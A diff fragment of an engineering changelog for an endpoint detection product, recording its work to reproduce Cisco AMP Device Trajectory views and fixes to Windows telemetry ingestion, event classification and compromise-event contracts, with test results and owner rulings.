+  FILE activity**; selecting `certutil.exe` showed WHY =
+  `CANONICAL_PARENT_PROCESS_IDENTITY · IDENTITY DOWNGRADED · 3 evidence refs`;
+  AFTER → `CAUSALITY_UNKNOWN`; PARENT nav moved selection to
+  `pnode:proc_86dd9e202435`. Families on THIS evidence: FILE OBSERVED, DNS /
+  NETWORK / REGISTRY **NOT_OBSERVED** (not fabricated).
+- Known gaps (honest): this corpus stamps every event at 2026-06-01T10:00:00Z
+  so lifelines have no temporal spread (axis works, evidence is flat);
+  detection markers not yet on the lane (separate step); Inspector (raw /
+  provenance) is the next separate step.
+- NEXT: Trajectory Inspector, then detection markers / remaining AMP
+  interaction gaps, then process/activity/behavior trees + bidirectional
+  pivots. Super Admin Control Center still parked.
 
 ---
 
-## ✅ 2026-02-35 · P0.2 Detection Content Fabric — Rounds 3–6 · SHIPPED
+## 2026-06 · DT2-3 UI CORRECTION — STRICT CISCO AMP PARITY AUDIT (owner-directed)
 
-The full detection-content dependency chain now stands, and the
-authoritative registry finally reports **`detection_capable = 1`**
-— earned by execution proof, not by relabelling.
+Owner reset the phase: **PHASE 1 = reproduce the publicly verifiable Cisco
+Secure Endpoint / AMP Device Trajectory analyst experience.** No NivXForge
+enhancements visible until parity is accepted. Engines are NOT to be weakened —
+only the presentation is corrected, with removed controls parked behind a flag.
 
-**Round 3 · P0.2c Implementation Capability Contracts**
-`/api/admin/content-supply-chain/contracts/*` — 329 machine-readable
-contracts declared, one per discovered implementation, all at
-`CONTRACT_DECLARED`, `execution.detection = False`, `detection_capable = 0`.
-Contracts.py + contract_registry.py, 8/8 pytests, frozen-state guard
-so verified contracts never regress.
+Owner-selected constraints for this step:
+1. PARITY TABLE ONLY — zero UI / code / data changes.
+2. Removed controls: hide from AMP-parity presentation only; keep
+   engines/handlers intact behind a parked flag.
+3. Inventory scope: Device Trajectory page + its Amp*/dt2 components only.
+4. No Cisco reference found ⇒ `REFERENCE_BEHAVIOR_NOT_VERIFIED` ⇒ propose
+   REMOVE (owner may grant explicit exceptions).
+5. Exact Cisco doc/page/section URL required per row.
 
-**Round 4 · P0.2b Strict pySigma Parse**
-`detection_content/sigma_strict.py` — pySigma AST replaces the
-permissive YAML loader.  Every rule ends deterministically at
-PARSED / PARSE_ERROR / COMPILE_ERROR / LIB_MISSING with error type
-and message preserved.  6/6 pytests.  Wired into sigma_ingest so
-compatibility reports carry a strict-parse breakdown +
-parse_errors[] samples.
+Delivered: `/app/memory/production-gates/DT2_3_AMP_PARITY_TABLE.md`
+- 136 visible elements audited across 9 groups.
+- KEEP 33 · CHANGE 25 · REMOVE 62 · MISSING_IN_NIVXFORGE 16 ·
+  REFERENCE_BEHAVIOR_NOT_VERIFIED 62.
+- Cisco source register C1–C11 (Secure Endpoint User Guide p.401–411 verbatim,
+  UW–Madison KB 90059 console walkthrough, Cisco TechNotes 222850 / 218067,
+  Cisco Live TACSEC-2012). C11 is **negative evidence**: click-to-zoom is
+  documented for Mobile App Trajectory, NOT Device Trajectory — so Zoom in /
+  Zoom out are not parity controls.
+- 7 ambiguous items escalated for owner decision (navigator +/- collapse
+  reference, evidence-integrity messaging, tenant-boundary prose, theme toggle,
+  disposition values, DNS/REGISTRY families, files-as-vertical-axis-rows).
 
-**Round 5 · P0.2d Rule ↔ Capability Matching**
-`detection_content/rule_binding.py` + POST /binding/match +
-GET /binding/report.  Per-pair verdicts: COMPATIBLE ·
-CANDIDATE_ONLY · INCOMPATIBLE_INPUT · NOT_DETECTION.  Rule status
-rolls up to COMPATIBLE / CANDIDATE_ONLY / **ENGINE_UNBOUND** —
-each surfaced with the honest reason.  6/6 pytests.
+STATUS: **BLOCKED ON OWNER LINE-BY-LINE REVIEW.** No UI work begins until the
+table is approved. `git status` confirms the only change is the new document.
 
-**Round 6 · P0.2e Detection Execution Harness**
-`detection_content/detection_harness.py` + POST /harness/run +
-GET /harness/engines.  Positive + negative fixture runner; only
-when BOTH assertions match does a contract move from
-CONTRACT_DECLARED → **EXECUTION_VERIFIED** and
-`execution.detection` flip True.  7/7 pytests.
+Backlog unchanged and still parked: DT2-4 Evidence Inspector V2, DT2-5
+structured search + MATCH navigation, DT2-6 detection navigation, DT2-7
+investigation pivots, DT2-8 virtualization/performance, DT2-9 analyst
+acceptance, P2 wider Windows event coverage, P2 full investigation surface,
+P2 Super Admin Control Center. All NivXForge-only trajectory surfaces move to
+**PHASE 2 — NIVXFORGE ENHANCEMENTS** (post-parity).
 
-Plus the FIRST real detection engine:
-`detection_content/nivxray_native_sigma.py` — deterministic Sigma
-subset (equals · |contains · |startswith · |endswith · |re · lists +
-|all + condition parser).  Any unsupported Sigma primitive raises
-UnsupportedSigmaFeature; harness treats it as FAILED.
+### REV 2 amendment (same day) — owner navigator ruling accepted, two new Cisco sources
+- Owner's citation verified verbatim: C12 = AMP for Endpoints User Guide p.171
+  "The Navigator" — *"You can collapse the navigator by clicking the - button
+  and expand it again by clicking on the ribbon or the + button."* Row #35
+  reclassified DOCUMENTED, REMOVE → CHANGE. Trajectory Zoom In/Out (#36/#37/#62)
+  stay REMOVE (C11 negative evidence). The two interactions are NOT conflated.
+- C12 also establishes: 30-day upper ribbon, miniature line graph above it,
+  RED DOTS = compromise events, SEARCH RESULTS = BLUE DOTS, dot size relative to
+  events per day, 24-hour ribbon = selected day.
+- C13 = current Secure Endpoint User Guide p.405 "Trajectory Indications of
+  Compromise" — yellow highlighting of IOC events, a separate compromise event,
+  BLUE HALO on the triggering events when clicked, and *"A description of the
+  indicator and the tactics and techniques will also be displayed in the Event
+  Details pane"*. This REVERSED row #115 (MITRE box): REMOVE → CHANGE, DOCUMENTED.
+- New Group J (all MISSING): #137 yellow IOC highlighting · #138 separate
+  compromise event · #139 blue halo · #140 search results as blue dots.
+- REV 2 totals: 140 audited · KEEP 33 · CHANGE 27 · REMOVE 60 · MISSING 20 ·
+  NOT_VERIFIED 60.
+- Delivered additionally: DAY_TIME_NAVIGATOR_BEHAVIOR_MATRIX (N1–N11 — navigator
+  is NOT a clone: 1 conforming, 4 partial, 2 non-conforming, 2 missing,
+  1 conflicted) and the seven escalated ambiguities written out individually.
+- NEW AMBIGUITY #8: the line graph above the dates has two conflicting Cisco
+  definitions — cloud queries per day (C3 p.403) vs level of activity (C12
+  p.171). NivXForge does not collect cloud-query volume.
+- STATUS: still BLOCKED. CODE/UI/DATA unchanged; no Phase-2 flag designed.
+  Awaiting owner rulings on ambiguities 2–7 and new #8.
 
-**Live proof (against production `test_database`)**
+### REV 3 (same day) — owner rulings recorded; DT2-3a BLOCKED on reference screenshots
+- All 8 rulings recorded in the parity doc (#2 remove engineering wording,
+  #3 remove tenant prose, #4 theme toggle OUT OF SCOPE, #5 disposition with
+  no-falsification constraint, #6 DNS/REGISTRY preserved but not presented as
+  Cisco parity, #7 files-on-axis = DT2-3b IN SCOPE, #8 hide the cloud-query
+  line graph and record the data gap). Sequence fixed: DT2-3a → DT2-3b → DT2-3c.
+- Owner adopted a SCREENSHOT EVIDENCE RULE: owner-supplied Cisco AMP screenshots
+  are the PRIMARY visual reference and outrank prose. Anything visible in them
+  is SCREENSHOT_VERIFIED. Therefore all 60 REFERENCE_BEHAVIOR_NOT_VERIFIED rows
+  must be re-tested against those screenshots BEFORE anything is hidden.
+- BLOCKER: the 1,660 job artifacts are mostly NivXForge captures with opaque
+  names. Eight best Cisco-looking candidates were inspected: they are Cisco XDR,
+  Cortex XDR, MS Defender (x2), SentinelOne, Elastic and one NivXray page — NOT
+  AMP Device Trajectory. Proceeding would risk cloning the wrong product.
+- ACTION REQUIRED FROM OWNER: identify the Cisco Device Trajectory screenshots
+  by artifact URL / filename / re-attach. Then: region comparison A–Q → re-test
+  the 60 rows → one DT2-3a pass.
+- CODE/UI/DATA unchanged. No Phase-2 flag. No deletions.
+
+### REV 4 (same day) — Cisco screenshot reference set ESTABLISHED; DT2-3a re-scoped, not executed
+- The four owner ServiceNow URLs are behind Cisco SSO: REFERENCE ARTIFACT NOT
+  ACCESSIBLE (auth_redirect → id.cisco.com SAML). Owner-authorised fallback used.
+- Extracted Cisco's OWN figures from the official Secure Endpoint User Guide PDF
+  and stored them: /app/memory/production-gates/cisco_ref/
+  CISCO_DT_FULL_PAGE_p402.png (the complete Device Trajectory page),
+  CISCO_DT_NAVIGATOR_p403.png, CISCO_DT_DEVICE_DETAILS_p404.png,
+  CISCO_DT_IOC_TEXT_p405.png. No other vendor's screenshot used as evidence.
+- A–Q comparison done: MISMATCH 7, PARTIAL 6, MISSING 1, NOT OBSERVED 3, MATCH 0.
+  Header must be the DEVICE NAME + Show details + Actions + Inbox status + share
+  + expand; search LEFT / Filters RIGHT; navigator = blue line + in-cell sized
+  red dots + filled 24h band; gutter = right-aligned labels with [PE] type tag,
+  pink highlight for malicious, System / Files & Network section headers; green
+  lifeline with square glyphs; Activity pane has NO count and NO time column;
+  and Cisco has NO trajectory toolbar at all.
+- 60-row retest: 5 reclassified (fullscreen icon KEEP, [rowTag] CHANGE, navigator
+  chevron CHANGE, triangle handles downgraded to REMOVE, compromise-events count
+  relocated to the drawer); 55 remain NOT_VERIFIED; 1 excluded (theme).
+  New totals: KEEP 34 / CHANGE 30 / REMOVE 55 / MISSING 20 / EXCLUDED 1.
+- DT2-3a deliberately NOT executed: the retest re-scoped it, and running the old
+  plan would have cloned the wrong layout. CODE/UI/DATA unchanged.
+- NEXT: one DT2-3a pass on the corrected plan; acceptance on WS-W1-1789575060 /
+  dev_0e10780f2c86 with real evidence only.
+
+### DT2-3a EXECUTED (same day) — AMP-parity presentation correction, live
+- 8 files changed: AmpFilterBar / AmpNavigator / RelationshipCanvas /
+  AmpComputerHeader rewritten; AmpActivityPanel / AmpEventDetails /
+  EdrDeviceTrajectoryPage edited; graphModel.test.js retargeted.
+- Applied: KEEP 34 preserved · CHANGE 24 implemented · REMOVE 55 hidden behind
+  `PARKED_NIVXFORGE_UI` (nothing deleted) · MISSING 3 implemented (Share > Copy
+  URL, Copy SHA-256 ×2) · 5 deferred to DT2-3b · 4 deferred to DT2-3c.
+- Header is now the DEVICE NAME + Show details + Actions + share + expand.
+  Search LEFT / Filters RIGHT with Enter-to-submit. Navigator: day cells with
+  sized red compromise dots, plain filled 24h band, `−`/`+` collapse and
+  ribbon-click expand. Graph: Timeline gutter, date columns, rotated ticks,
+  `Files & Network` section, right-aligned labels with `[PE]`, solid green
+  lifelines, square glyphs. Activity pane: no count, no time column, ⚠ prefix.
+  Toolbar, mode tabs, basis rail, all banners and tenant prose: gone.
+- A–Q after: MATCH 12 / PARTIAL 3 / MISMATCH 2 (was 0 / 6 / 7 + 1 missing).
+- Tests: 118/118 pass (was 115; 7 old presentation assertions retargeted to the
+  engine or inverted into parity guards, 3 new parity tests added).
+- Live acceptance: WS-W1-1789575060 / dev_0e10780f2c86, customer `default`,
+  16 lanes, 15 activity rows, 1 compromise dot, 0 page errors. One crash found
+  and fixed during acceptance (`Prop` title on explicit null).
+- Truthful data gaps recorded, incl. CISCO FEATURE DATA SOURCE NOT AVAILABLE IN
+  NIVXFORGE for the cloud-query line graph (omitted, not substituted).
+- Reference figures kept at /app/memory/production-gates/cisco_ref/ as INTERNAL
+  ENGINEERING REFERENCE ONLY — never bundled, served or shipped.
+- STOPPED for owner visual review. DT2-3b / DT2-3c not started. No deployment.
+
+### DT2-3a VISUAL REVIEW (same day) — 9 new visual defects found, nothing changed
+- Built the side-by-side (Cisco p.402 figure above, live DT2-3a capture below):
+  /app/memory/production-gates/cisco_ref/DT2_3A_SIDE_BY_SIDE.png (internal only).
+- 19 elements ruled individually: 13 RESEMBLE, 5 PARTIAL, 1 NOT PRESENT (System).
+- Five recorded differences ruled: #1 files→DT2-3b, #2 IOC→DT2-3c, #3 cloud-query
+  line CLOSED BY OWNER RULING (no substitution; blue search dots move to
+  DT2-3a.1), #4 filters→DT2-3a.1, #5 graph width RESOLVED.
+- NEW defects F1–F9 found only by looking at the figure: Actions must be a
+  FILLED blue primary; Filters must be a borderless blue text control with a
+  filter glyph; navigator collapse belongs at the LEFT of the ribbon; section
+  labels need Cisco weight/alignment and System must always show; time ticks are
+  EVENT-ANCHORED plus hour marks, not 6 evenly spaced; graph scrollbars need
+  ◀ ▶ / ▲ ▼ arrow buttons; graph card must size to content; the 24h window
+  region should be a narrow sub-range; and the Cisco reference console is LIGHT
+  while we default to dark.
+- OWNER DECISIONS PENDING: F4 (permanent empty System band), F8 (narrower
+  default window), F9 (light theme for parity review).
+- Sequence fixed: close DT2-3a visual defects → DT2-3a.1 filters/search →
+  DT2-3b files/process → visual review → DT2-3c IOC.
+- CODE/UI/DATA unchanged in this step.
+
+### DT2-3a(F1–F9) + 3a.1 + 3b + 3c EXECUTED (same day)
+- Tests 122/122. Files: AmpComputerHeader, AmpFilterBar, AmpNavigator,
+  RelationshipCanvas, AmpEventDetails, EdrDeviceTrajectoryPage, dt2/graphModel,
+  graphModel.test.
+- F1 filled Actions · F2 borderless Filters+glyph · F3 collapse left of ribbon ·
+  F4 permanent Timeline/System/Files&Network (Cisco weight, centred) · F5
+  event-anchored ticks + hour marks · F6 ▲▼ ◀▶ + return-to-row/event · F7
+  content-sized graph · F8 evidence-bearing default window (no timestamps moved)
+  · F9 light Cisco surface by default (dark still wins if chosen).
+- 3a.1: five Cisco filter categories, one-per-category rule, Apply Filters,
+  at:<timestamp> grammar, blue search-result dots. No CLEAN/flags/file-type
+  values manufactured.
+- 3b: axisRowsOf promotes FILE artefacts to first-class rows ONLY with canonical
+  FILE evidence + the server process→artefact edge. Live: certutil.exe →
+  C:\Users\Public\payload.exe file row with a real PROCESS_FILE stem (1 file
+  row, 13 process stems, 17 rows).
+- 3c: PARTIAL/BLOCKED. dt2.graph activity_nodes carry NO disposition/detection
+  and no indicator contributor set, so yellow highlighting, the separate
+  compromise event and the blue halo cannot be drawn truthfully. Wired but inert
+  (isCompromise, dt2-ioc-mark-*). TO UNBLOCK: publish disposition/detection and
+  the indicator's contributor evidence_refs on activity nodes in projection.py.
+- Final A–Q: MATCH 14 / PARTIAL 2 / MISMATCH 1. Zero engineering-language leaks.
+  Tenant isolation demonstrated. 0 page errors. Not deployed.
+- Side-by-side: cisco_ref/DT2_FINAL_SIDE_BY_SIDE.png
+
+### DT2-3a.2 · TIME DOMAIN / VIEWPORT PROJECTION (BLOCKER, same day)
+- Owner rejected the vertical "comb". Root cause split proven:
+  (1) primary viewport was the whole selected day (86.4M ms) while the evidence
+      span is 0 ms → FIXED with `evidenceWindow()` (120 000 ms window here),
+      viewport-derived ticks, and `rowsInWindow()` row relevance.
+  (2) projection was NOT broken: rendered X = 238 + ((t−t0)/(t1−t0))×1000 =
+      738.00 for every event, verified against the live DOM.
+- NEW BLOCKER `TELEMETRY_TIMESTAMP_COLLAPSE`: all 15 observations of
+  dev_0e10780f2c86 carry one identical timestamp (10:00:00Z, seq 0–14); no
+  per-event UtcTime survives ingestion. Horizontal progression is impossible
+  without fabricating time. Needs a collector/normalizer fix.
+- Unknown process ×3: parent identity exists in the child's evidence
+  (`event.process.parent_name = explorer.exe`) but dt2-2a does not propagate it.
+- Acceptance record: memory/production-gates/DT2_3_CISCO_CLONE_ACCEPTANCE.md
+- Tests 137/137 (122 + 15 new). DT2-3b/3c remain BLOCKED per owner ruling.
+
+---
+
+## 2026-09-29 · DT2-3a.2 CLOSED · DT2-3b SEMANTICS + CISCO PARITY (A-D)
+
+Acceptance corpus switched to the REAL Windows corpus
+`dev_2adbb41a04a4` / DESKTOP-A9HGFJJ (tenant `ten_f1a5479243e901cf159e230fa0`),
+3298 genuine Sysmon/Security observations, 15:43-16:46 UTC on 2026-09-22.
+
+**CORRECTION to the previous entry.** The claim *"NEW BLOCKER
+TELEMETRY_TIMESTAMP_COLLAPSE — no per-event UtcTime survives ingestion, needs a
+collector/normalizer fix"* is **WRONG**. Provenance traced end to end: the W1
+harness `scripts/p0_w1_sysmon_onboarding_proof.py:132` hardcodes
+`"UtcTime": "2026-06-01T10:00:00Z"` for all 15 records and the pipeline
+preserved it exactly. Classified `SINGLE_INSTANT_SYNTHETIC_ACCEPTANCE_FIXTURE`.
+No timestamp-collapse defect exists.
+
+Delivered:
+- **DT2-3a.2 CLOSED** — timestamp→X proven to 0.00 px on live DOM.
+- **`TS_LEXICOGRAPHIC_WINDOW_EXCLUSION` fixed** (P0 correctness). `query_window`
+  compared timestamps as STRINGS, so all 3333 genuine Sysmon observations
+  (`2026-09-22 15:43:31.770` < `…T…Z`) were excluded from every windowed read.
+  Now parsed instants (`edr_plane/instant.py`) for inclusion, sorting and cursor
+  paging; new ingestion writes RFC 3339; **no backfill, evidence byte-identical**.
+- **Lane axis grouped** — each file/network/dns lane now follows the process
+  lane its own evidence names (`actor_process_iid`), so a windowed client can
+  hold a process with its artefacts and render process→file stems.
+- **Client instant parser** (`dt2/instant.js`) — `Date.parse` was reading
+  Sysmon's space form as the analyst's LOCAL time.
+- **Cisco file-type display rule** (`dt2/fileType.js`, TAC 118711 + p.401) —
+  removed the `.ldb/.tmp/.log` explosion; `Other` restores it, nothing deleted.
+- **Repeat-event suppression** (p.401 cache) — projection-layer only, labelled
+  `+N suppressed`, reversible; fails to NO suppression where the disposition
+  rule is undocumented (this corpus: 0 suppressed).
+- **Process de-selection** — sixth filter category; no re-parenting.
+- **Compromise navigation** — `compromise_authority` gate removed a
+  FABRICATION: 3102 Sysmon registry events carried `kind=detection` and were
+  drawing navigator compromise markers.
+
+Records: `DT2_3A2_LIVE_RENDER_PROOF.md`, `DT2_3A2_TIMESTAMP_PROVENANCE.md`,
+`DT2_3B_BLOCKER_TS_LEXICOGRAPHIC_WINDOW.md`, `DT2_3B_PROCESS_FILE_PROOF.md`,
+`DT2_3B_CISCO_VISUAL_PARITY.md`, `CISCO_AMP_TRAJECTORY_ENGINEERING.md`,
+`DT2_3B_CISCO_SEMANTICS.md`, `DT2_PARITY_BACKLOG.md`.
+
+**NEXT: DT2-3c** (IOC parity). Blue halo blocked on
+`IOC_CONTRIBUTOR_PROVENANCE = MISSING`. P1 backlog: file content identity,
+file size, execution context, connector lifecycle telemetry, IOC contributor
+contract, SHA-based process/file identity, sysmon registry `kind` defect.
+P2: trajectory API parity. No production deployment.
+
+
+## 2026-06 · STEP 1 DONE — EVENT ID PROPAGATION + INGESTION FALLBACK AUDIT
+- Owner-approved scope: Step 1 ONLY (read-only diagnostic first,
+  audit-and-fix ingestion/canonicalization only, existing 3,100+ records
+  untouched, focused pytest + written report, then STOP).
+- FIRST LOSS BOUNDARY = `v2/ingestion/telemetry_bridge.py::canonical_to_ces`,
+  NOT the collector. Two canonical dialects funnel through it and only one
+  was understood: the EDR sensor bridge (`additional_fields.winlog.event_id`,
+  `registry.key`) vs the XDR DSM plane (`source_event_id`,
+  `raw_ref.sysmon_event_id`, `RegistryEntity.key_path/target_object`). Every
+  DSM-normalised record therefore reached the CES with `event_id=None` AND
+  `registry_key=""`, so neither the authoritative branch nor the registry
+  heuristic could fire and the catch-all took over — 3,120 Sysmon registry
+  observations stamped `kind=detection`.
+- FIX (forward-only, 2 product files): `source_event_id()` resolves the
+  authoritative Event ID across both dialects in declared precedence and
+  reports its origin; `channel` and `registry_key` likewise; one strict
+  lossless coercion `canonical.event_id_int()` accepts `12`/`"12"` and
+  REFUSES bool/float/hex/`"12abc"`/empty; `resolve_kind()` now returns
+  `(kind, basis)` and stamps `provenance.kind_basis`
+  (SOURCE_EVENT_ID / EVENT_ID_NOT_SUPPORTED / DERIVED_FROM_OBSERVED_FIELDS /
+  UNCLASSIFIED_INSUFFICIENT_EVIDENCE); `raw_event.source_identity` preserves
+  provider/channel/event_id/verbatim source value/record_id/computer/
+  source_time so the projection stays traceable to the source observation.
+- PERMANENT INVARIANT pinned: `SECURITY_CLAIM_KINDS` + a parametrised test —
+  unknown/unclassified/unsupported/missing/malformed/parse-failure input can
+  NEVER resolve to detection/malicious/ioc/compromise/clean/benign/blocked/
+  contained/verified/alert.
+- TESTS: new `tests/edr/test_event_id_propagation.py` **97 passed**; targeted
+  regression 125 passed; whole `tests/edr` 1174 passed / 3 skipped / 7 failed
+  where all 7 are PRE-EXISTING (6 reproduce at HEAD with the patch stashed;
+  1 is a live-DB xdist flake that passes in isolation). Zero new ruff findings.
+- EXISTING_3100_MUTATED = NO · DATA_CHANGED = NO · DEPLOYED = NO.
+- FLAGGED FOR OWNER, NOT CHANGED: (a) `WINSEC_KIND` maps 4720/4732/4738
+  (account created/member added/account changed) straight to
+  `kind="detection"` from KNOWN input — ordinary account-management telemetry
+  presented as a detection; (b) consequently the winsec provider gate is NOT
+  extended to the DSM dialect's `"Windows Security Log"` product string
+  (7 historical records), because doing so would immediately start minting
+  those detections; (c) `trajectory_window.py` still reads
+  `kind == "detection"` as a claim (compromise marker already gated behind
+  `compromise_authority`).
+- Report: `memory/production-gates/EVENT_ID_PROPAGATION_AND_FALLBACK_AUDIT.md`
+- NEXT (needs owner authorisation, in this order): Step 2 clean re-projection
+  of the retained raw G1 evidence into a NEW acceptance tenant/device →
+  IOC contributor contract (`compromise_event.contributing_event_refs[]`) →
+  DT2-3c IOC visual parity → final Cisco trajectory parity → Endpoint Engine
+  Foundation. Owner must also rule on flagged item (a) to unblock (b).
+
+## 2026-06 · WINSEC SEMANTICS + CLEAN REPROJECTION + CONTRIBUTOR CONTRACT
+- Owner ruling executed in order: Account Event Ruling -> Clean Reprojection
+  -> Contributor Contract. Classification Audit View recorded as a
+  non-blocking backlog feature, NOT built. DT2-3c NOT started.
+- WINSEC SEMANTIC AUDIT (all 17 entries reviewed; 7 changed, 6 of those were
+  a security claim or a factual error): 4720 -> `user_account_created`,
+  4732 -> `security_group_member_added`, 4738 -> `user_account_changed`
+  (were all `detection`); 4672 -> `special_privileges_assigned` (was
+  `privilege_escalation`); 1102 -> `audit_log_cleared` (was `alert`);
+  4634 -> `logoff` (was `logon_success`); 4776 -> `credential_validation`
+  (was `logon_success` — 4776 is logged for failures too); 4700 ->
+  `scheduled_task_enabled` (was conflated with create); dead `"*"` catch-all
+  key REMOVED. Names REUSED from the existing `windows_security_dsm`
+  event_type vocabulary — no duplicate vocabulary.
+- GOVERNANCE AMENDMENT: `v2/cem/v1/schema.py::EVENT_KINDS` 41 -> 50 (the new
+  observation kinds + `unclassified_telemetry`, which the classifier already
+  emitted while being absent from the locked enum); frozen count in
+  `tests/test_v2_framework.py` amended deliberately. `_AUTH_KINDS` in
+  `trajectory_window.py` + `trajectory/contract.py` gained
+  `credential_validation`. Both lane maps already default to `system`.
+- WINDOWS SECURITY PROVIDER GATE enabled on SOURCE evidence, never a display
+  label: `source_provider()` resolves `winlog.provider` ->
+  `raw_ref.System.Provider` -> `raw_ref.provider` -> privileged channel
+  (Security / Sysmon Operational) -> and only then the vendor+product label,
+  explicitly marked `VENDOR_PRODUCT_LABEL`. On the reprojected corpus 3,299
+  of 3,299 resolved from a SOURCE-STATED provider; 0 fell back to the label.
+  Also fixed: the Sysmon parser/normalizer discarded the record's own
+  `Provider` and `EventRecordID`; both are now carried in `raw_ref`, so
+  `source_identity.record_id` is populated on 3,299/3,299 rows.
+- CLEAN REPROJECTION DONE via `/app/scripts/g1_clean_reprojection.py`.
+  Replayed the BYTE-PRESERVED raw Windows Event XML retained in
+  `xdr_canonical_events` (reached through each evidence document's own
+  `provenance.ingest.raw_envelope_ref`) through the same decoder and the DSM
+  named by the RECORDED routing decision (never re-resolved by content) into
+  a NEW tenant `ten_3f7f772b353a6bbbb0ac8bc564` (slug `g1-acceptance-clean`,
+  LAB, same ACTIVE org) and a NEW device identity `dev_f4b3fb82d7f3` (the
+  source computer name is preserved verbatim; only the identity SCOPE is
+  new). 3,299 replayable, 0 failures, 3,299 written.
+  RESULT: 100% classified from a SOURCE-STATED Event ID —
+  registry_value_set 2335 (Sysmon 13), registry_create 766 (Sysmon 12),
+  file_create 107, network_connect 70, process_create 16,
+  special_privileges_assigned 2 (4672), logon_success 2 (4624), dns_query 1.
+  3,102 `detection` -> 0. UNCLASSIFIED_TO_DETECTION = 0,
+  UNKNOWN_TO_SECURITY_CLAIM = 0, FALSE_COMPROMISE_FROM_CANONICAL_KIND = 0.
+  OLD_CORPUS_MUTATED = NO (3298/3102 identical before and after).
+  Every row carries a `reprojection` block including
+  `detection_state: DETECTION_NOT_EVALUATED` ("NOT_EVALUATED is not CLEAN").
+  4720/4732/4738 are proven by contract + a 17-case end-to-end test, NOT by
+  the corpus — this host never emitted them in the G1 window (honest gap).
+- CONTRIBUTOR CONTRACT DEFINED (not wired to any route, nothing persisted):
+  `backend/edr_plane/compromise_contract.py` — compromise_event_id,
+  indicator_id, authority, derivation_basis, description, tactics[],
+  techniques[], contributing_event_refs[], evidence_refs[], observed_at,
+  contributors_state. 3 authorities only (DETECTION_FABRIC_ATTRIBUTION,
+  MITRE_ATTRIBUTED_EVIDENCE, IOC_CORRELATION_ENGINE); 19 FORBIDDEN_BASES
+  rejected case-insensitively (temporal proximity, same PID, same lane, UI
+  proximity, adjacent-in-render, inferred, guess...); contributor named by a
+  different mechanism refused; raw dicts cannot be smuggled in; MITRE ids
+  validated. Missing provenance stays missing via
+  CONTRIBUTORS_NOT_PROVEN_BY_AUTHORITY, so DT2-3c's contributor emphasis is
+  disabled BY DATA. Producers: `from_detection_derivation()` (only
+  DETECTION_MATCHED; NO_MATCH and NOT_EVALUATED refused; contributors are
+  exactly the subject observation + the derivation's own evidence_ids) and
+  `from_mitre_attributed_evidence()` (proves exactly one contributor).
+- TESTS: new `test_winsec_semantics.py` 87 + new
+  `test_compromise_contributor_contract.py` 68 + `test_event_id_propagation`
+  97; whole `tests/edr` 1316 passed / 3 skipped / 7 failed where all 7 are
+  the SAME pre-existing failures proven at HEAD with the patch stashed.
+  Zero new ruff findings. DEPLOYED = NO.
+- Report: memory/production-gates/
+  WINSEC_SEMANTICS_CLEAN_REPROJECTION_CONTRIBUTOR_CONTRACT.md
+- OPEN FOR OWNER: (1) Sysmon proxy mappings — 255 -> `alert` is the last
+  security-claim kind from a known Event ID (pinned by a shrink-only test);
+  also 2/4/9/14/24/25 semantic proxies; (2) `event.iid` is a CONTENT hash and
+  is NOT a unique observation identity (2,250 of 3,299 distinct records
+  collide; the historical corpus shares this property); (3) go-ahead for
+  DT2-3c and whether to wire the contributor contract into
+  `GET /api/edr/endpoints/{id}/trajectory` first.
+
+## 2026-06 · OBSERVATION IDENTITY · SYSMON RULING · CONTRACT WIRING · DT2-3c (PARTIAL)
+- Owner order executed: Observation Identity -> Sysmon Proxy Ruling ->
+  Contract Wiring -> DT2-3c. DT2-3c visual parity is NOT accepted yet.
+- OBSERVATION IDENTITY: `event.iid` KEEPS its meaning as the CONTENT identity.
+  New `observation_id` / `observation_identity_state` /
+  `observation_identity_key` on every observation, from
+  `canonical.observation_identity()`: tenant+device scoped, derived from
+  authoritative source identity (provider|channel|computer|EventRecordID),
+  else the STABLE retained raw row id. `canonical_event_id` is deliberately
+  excluded (normalizers mint a fresh uuid4 per pass, so it cannot survive
+  replay). No sequence counter is ever used for uniqueness; when the source
+  carried nothing unique the state is `NOT_PROVEN_UNIQUE` and no uniqueness
+  is claimed. `_event_iid` in trajectory_window now prefers it, and the DT2
+  OBSERVATION evidence reference carries it.
+  PROOF on the clean corpus: OBSERVATIONS 3299 / UNIQUE_OBSERVATION_IDS 3299
+  / CONTENT_IID_COLLISIONS 2250 (1049 distinct content iids) / identity
+  state 100% UNIQUE_BY_SOURCE_RECORD_IDENTITY / replay pass 2 wrote 0.
+- SYSMON RULING (owner scope 255 + 2/4/9/14/24/25): 2 file_write ->
+  `file_creation_time_changed`; 4 process_exit ->
+  `sensor_service_state_changed`; 9 file_write -> `raw_disk_access_read`;
+  14 registry_delete -> `registry_rename`; 24 file_write ->
+  `clipboard_change`; 25 process_access -> `process_image_tampering`;
+  255 `alert` -> `sensor_error`. NO Sysmon or WinSec Event ID now produces a
+  security claim (both tables pinned by tests). EVENT_KINDS 50 -> 57 with
+  lane mappings; the other 19 Sysmon ids were left untouched.
+- CONTRACT WIRING: new `edr_compromise_events` + `edr_plane/compromise_store.py`.
+  Only a validated `CompromiseEvent` can be persisted; every stored row is
+  RE-VALIDATED through the contract on READ (a row written straight to Mongo
+  with `SAME_PID` is rejected). `query_window` resolves
+  `contributing_event_refs[]` against the projection's `observation_id`s and
+  emits `compromise_events` + `compromise_contract`
+  (`reference_identity=observation_id`, `resolved_server_side=true`,
+  `frontend_may_infer_contributors=false`). Unresolvable ref -> explicit
+  `UNRESOLVED_NOT_IN_PROJECTION`, never nearest-event substitution.
+  Cross-tenant / cross-device -> never read.
+- DT2-3c FRONTEND: `dt2/compromise.js` (no inference; `attachContributors`
+  is an identity join on server-provided OBSERVATION refs), `isCompromise`
+  (which inferred from detection flags and lit 3,100 rows) REPLACED by
+  `isProvenContributor`, yellow IOC band + diamond marker,
+  blue contributor halo, `AmpCompromisePanel` (indicator, description,
+  authority, tactics, techniques, contributor/unresolved counts),
+  Event Details "Indication of compromise" section, AmpCanvas bands now
+  authoritative. Fixture: `scripts/dt2_3c_ioc_fixture.py`.
+- PROVEN LIVE: fixture endpoint `ep_dt23cfixture01` renders 1 IOC band, 1
+  marker, 3 blue halos at 3 DISTINCT X (each contributor's own timestamp and
+  row); the content-identical TWIN is NOT emphasised. Real corpus returns
+  `NO_AUTHORITATIVE_COMPROMISE_OBSERVED` — REAL_WINDOWS_COMPROMISE = NOT
+  OBSERVED, which is not a clean claim.
+- TESTS: backend `tests/edr` + framework + ingestion = 1438 passed / 3
+  skipped / 9 failed, all 9 PRE-EXISTING (proven at HEAD with the patch
+  stashed). Frontend vitest 189 passed (9 files). New suites:
+  test_observation_identity (30), test_sysmon_semantics (56),
